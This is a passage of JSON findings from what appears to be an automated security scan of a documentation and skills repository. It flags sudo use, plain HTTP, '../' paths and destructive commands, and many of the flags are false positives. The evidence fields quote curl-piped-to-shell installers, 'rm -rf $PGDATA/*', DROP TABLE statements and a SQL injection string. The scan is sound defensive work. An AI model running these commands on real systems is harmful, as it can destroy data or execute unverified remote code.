      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
      "line_number": 317,
      "issue": "Privilege escalation",
      "evidence": "sudo rm /swapfile",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/template.md",
      "line_number": 70,
      "issue": "Unencrypted HTTP",
      "evidence": "curl 'http://prometheus:9090/api/v1/query?query=[METRIC_NAME]'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/engineering/code-review/resources/examples/checklists/security-review.md",
      "line_number": 67,
      "issue": "Path traversal pattern",
      "evidence": "- [ ] File paths are validated (no ../ sequences)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/typed-holes-refactor/references/EXAMPLES.md",
      "line_number": 956,
      "issue": "Path traversal pattern",
      "evidence": "**Questions?** See [SKILL.md](../SKILL.md) for full methodology or [TROUBLESHOOTING.md](../SKILL.md#troubleshooting) for common issues.",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/infrastructure/kubernetes-basics.md",
      "line_number": 230,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend:8080;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 394,
      "issue": "Privilege escalation",
      "evidence": "\"sudo apt-get update\",",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 395,
      "issue": "Privilege escalation",
      "evidence": "\"sudo apt-get install -y nginx\",",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 1218,
      "issue": "Path traversal pattern",
      "evidence": "TerraformDir: \"../examples/complete\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 2255,
      "issue": "Pipe curl to shell",
      "evidence": "curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 2330,
      "issue": "Path traversal pattern",
      "evidence": "TerraformDir: \"../examples/vpc\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 2361,
      "issue": "Path traversal pattern",
      "evidence": "TerraformDir: \"../\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 2374,
      "issue": "Unencrypted HTTP",
      "evidence": "fmt.Sprintf(\"http://%s\", albDNS),",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 3504,
      "issue": "Path traversal pattern",
      "evidence": "source     = \"../modules/vpc\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 3510,
      "issue": "Path traversal pattern",
      "evidence": "source     = \"../modules/vpc\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 3675,
      "issue": "Path traversal pattern",
      "evidence": "source = \"../../modules/vpc\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 3685,
      "issue": "Path traversal pattern",
      "evidence": "source = \"../../modules/eks\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
      "line_number": 3796,
      "issue": "Path traversal pattern",
      "evidence": "source = \"../../../modules/vpc\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cicd/cd-deployment-patterns.md",
      "line_number": 598,
      "issue": "Force flag usage",
      "evidence": "aws ecs update-service --cluster prod --service myapp --force-new-deployment",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/cicd/ci-optimization.md",
      "line_number": 654,
      "issue": "Destructive file deletion",
      "evidence": "- run: rm -rf dist node_modules",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/frontend/react-state-management.md",
      "line_number": 521,
      "issue": "Path traversal pattern",
      "evidence": "import type { RootState, AppDispatch } from '../store/store';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/frontend/nextjs-seo/resources/REFERENCE.md",
      "line_number": 1016,
      "issue": "Unencrypted HTTP",
      "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/apache-iceberg.md",
      "line_number": 46,
      "issue": "Destructive database operation",
      "evidence": "- Supports transforms (year, month, day, hour, bucket, truncate)  <!-- NOTE: truncate is Iceberg's data transform function, not SQL TRUNCATE -->",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/apache-iceberg.md",
      "line_number": 238,
      "issue": "Destructive database operation",
      "evidence": "TruncateTransform(width=10)       # NOTE: Iceberg transform for trimming strings/numbers to width, not SQL TRUNCATE",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/apache-iceberg.md",
      "line_number": 545,
      "issue": "Destructive database operation",
      "evidence": "truncate(W, str)  | PARTITIONED BY (truncate(10, str)) | String prefixes  <!-- NOTE: Iceberg transform function -->",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/apache-iceberg.md",
      "line_number": 558,
      "issue": "Destructive database operation",
      "evidence": "write.metadata.metrics.default=truncate(16)  # NOTE: Iceberg's truncate transform for metrics, not SQL TRUNCATE",
      "recommendation": "Require backup and confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations.md",
      "line_number": 94,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE users;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations.md",
      "line_number": 455,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE IF EXISTS old_logs;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 165,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE users;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 582,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE users;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 689,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE IF EXISTS old_temp_table;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 1107,
      "issue": "Destructive database operation",
      "evidence": "| DROP TABLE | AccessExclusiveLock | \u2713 | \u2713 |  <!-- Example of operation impact -->",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 1498,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE users; -- \u26a0\ufe0f  Loses data!",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 1558,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf $PGDATA/*",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
      "line_number": 1891,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE events_2023_01;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 50,
      "issue": "Path traversal pattern",
      "evidence": "- **Migrations**: Loaded from `../sql/safe_migrations/`",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 112,
      "issue": "Path traversal pattern",
      "evidence": "-path ../sql/safe_migrations up",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 116,
      "issue": "Path traversal pattern",
      "evidence": "-path ../sql/safe_migrations down 1",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 127,
      "issue": "Path traversal pattern",
      "evidence": "dbmate -d ../sql/safe_migrations up",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 130,
      "issue": "Path traversal pattern",
      "evidence": "dbmate -d ../sql/safe_migrations down",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 143,
      "issue": "Path traversal pattern",
      "evidence": "cd ../python/alembic_migrations",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 191,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE IF EXISTS orders CASCADE;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 192,
      "issue": "Destructive database operation",
      "evidence": "DROP TABLE IF EXISTS users CASCADE;",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
      "line_number": 331,
      "issue": "Privilege escalation",
      "evidence": "sudo ufw allow 5432/tcp",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
      "line_number": 178,
      "issue": "Path traversal pattern",
      "evidence": "psql postgresql://testuser:testpass@localhost:5432/testdb -c \"EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 123\" | python ../../scripts/analyze_query.py --stdin",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
      "line_number": 181,
      "issue": "Path traversal pattern",
      "evidence": "python ../../scripts/suggest_indexes.py --query \"SELECT * FROM orders WHERE user_id = 123 AND status = 'pending'\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
      "line_number": 184,
      "issue": "Path traversal pattern",
      "evidence": "./../../scripts/benchmark_queries.sh --query \"SELECT * FROM orders WHERE user_id = 123\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\" --iterations 20",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 98,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install postgresql-client",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 105,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install jq",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 294,
      "issue": "Privilege escalation",
      "evidence": "sudo apt-get install jq",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 322,
      "issue": "Path traversal pattern",
      "evidence": "- [REFERENCE.md](../REFERENCE.md) - Deep dive into EXPLAIN, planner internals, and index types",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 323,
      "issue": "Path traversal pattern",
      "evidence": "- [examples/](../examples/) - Example slow queries and optimizations",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
      "line_number": 324,
      "issue": "Path traversal pattern",
      "evidence": "- Main skill: [postgres-query-optimization.md](../../postgres-query-optimization.md)",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft.md",
      "line_number": 319,
      "issue": "Unencrypted HTTP",
      "evidence": "etcd --name node1 --initial-cluster node1=http://10.0.1.1:2380,node2=http://10.0.1.2:2380,node3=http://10.0.1.3:2380",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/distributed-systems/consensus-raft/resources/REFERENCE.md",
      "line_number": 763,
      "issue": "Unencrypted HTTP",
      "evidence": "- RAFT consensus visualization: http://thesecretlivesofdata.com/raft/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/distributed-systems/consensus-raft/resources/scripts/README.md",
      "line_number": 117,
      "issue": "Privilege escalation",
      "evidence": "sudo mv etcd-v3.5.10-linux-amd64/etcd* /usr/local/bin/",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Network Security",
      "file": "skills/formal/lean-proof-basics.md",
      "line_number": 71,
      "issue": "Pipe curl to shell",
      "evidence": "curl https://raw.githubusercontent.com/leanprover/elan/master/elan-init.sh -sSf | sh",
      "recommendation": "Download, verify, then execute"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/formal/smt-theory-applications.md",
      "line_number": 731,
      "issue": "Destructive database operation",
      "evidence": "malicious = String(\"'; DROP TABLE users; --\")",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "HIGH",
      "category": "Dangerous Command",
      "file": "skills/formal/smt-theory-applications.md",
      "line_number": 734,
      "issue": "Destructive database operation",
      "evidence": "s.add(Contains(query, String(\"DROP TABLE\")))",
      "recommendation": "Require backup and confirmation before execution"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/formal/smt-theory-applications.md",
      "line_number": 792,
      "issue": "Unencrypted HTTP",
      "evidence": "- SMT-LIB: http://smtlib.cs.uiowa.edu/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/formal/z3-solver-basics.md",
      "line_number": 680,
      "issue": "Unencrypted HTTP",
      "evidence": "- SMT-LIB Standard: http://smtlib.cs.uiowa.edu/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/formal/sat-solving-strategies.md",
      "line_number": 776,
      "issue": "Unencrypted HTTP",
      "evidence": "- MiniSat: http://minisat.se/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/formal/sat-solving-strategies.md",
      "line_number": 778,
      "issue": "Unencrypted HTTP",
      "evidence": "- SAT Competition: http://www.satcompetition.org/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/collaboration/codetour-guided-walkthroughs.md",
      "line_number": 210,
      "issue": "Path traversal pattern",
      "evidence": "print(f\"  Description: {step['description'][:100]}...\\n\")",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/collaboration/github/github-pull-requests.md",
      "line_number": 580,
      "issue": "Force flag usage",
      "evidence": "git push --force origin feature/auth",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/collaboration/github/github-actions-workflows/resources/REFERENCE.md",
      "line_number": 1941,
      "issue": "Destructive file deletion",
      "evidence": "rm -rf node_modules  # Safe: cleaning CI cache",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/mobile/react-native-navigation.md",
      "line_number": 226,
      "issue": "Path traversal pattern",
      "evidence": "import { RootStackNavigation, ProfileRouteProp } from '../types/navigation';",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/mobile/react-native-setup.md",
      "line_number": 69,
      "issue": "Privilege escalation",
      "evidence": "- **CocoaPods**: `sudo gem install cocoapods`",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/mobile/react-native-setup.md",
      "line_number": 250,
      "issue": "Destructive file deletion",
      "evidence": "\"clean\": \"rm -rf node_modules ios/Pods ios/build android/build\",  # Cleans build artifacts only - safe to run",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/mobile/react-native-setup.md",
      "line_number": 251,
      "issue": "Destructive file deletion",
      "evidence": "\"clean:metro\": \"rm -rf $TMPDIR/metro-* $TMPDIR/haste-*\",  # Cleans Metro bundler cache - safe to run",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/mobile/react-native-setup.md",
      "line_number": 392,
      "issue": "Destructive file deletion",
      "evidence": "\u2705 Clear cache with `npm run clean:metro` or `rm -rf $TMPDIR/metro-*`  (safe - cleans Metro cache)",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/elegant-design/foundation/typography.md",
      "line_number": 290,
      "issue": "Path traversal pattern",
      "evidence": "src: '../public/fonts/jetbrains-mono.woff2',",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/cache-control.md",
      "line_number": 172,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 296,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app1:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 297,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app2:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 298,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app3:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 308,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app1:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 309,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app2:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 310,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app3:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 324,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app1:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/traefik-configuration.md",
      "line_number": 325,
      "issue": "Unencrypted HTTP",
      "evidence": "- url: \"http://app2:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 72,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 112,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 174,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 203,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 253,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 274,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 280,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://websocket_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 479,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://app_backend/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 500,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://app_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 538,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 544,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 550,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 574,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 583,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 606,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration.md",
      "line_number": 641,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://backend1.internal:8080/health",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 102,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 134,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 173,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://api_backend/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 178,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://admin_backend/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 185,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://web_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 267,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://backend1:8080\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 268,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://backend2:8080\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 269,
      "issue": "Unencrypted HTTP",
      "evidence": "\"http://backend3:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 490,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 506,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 527,
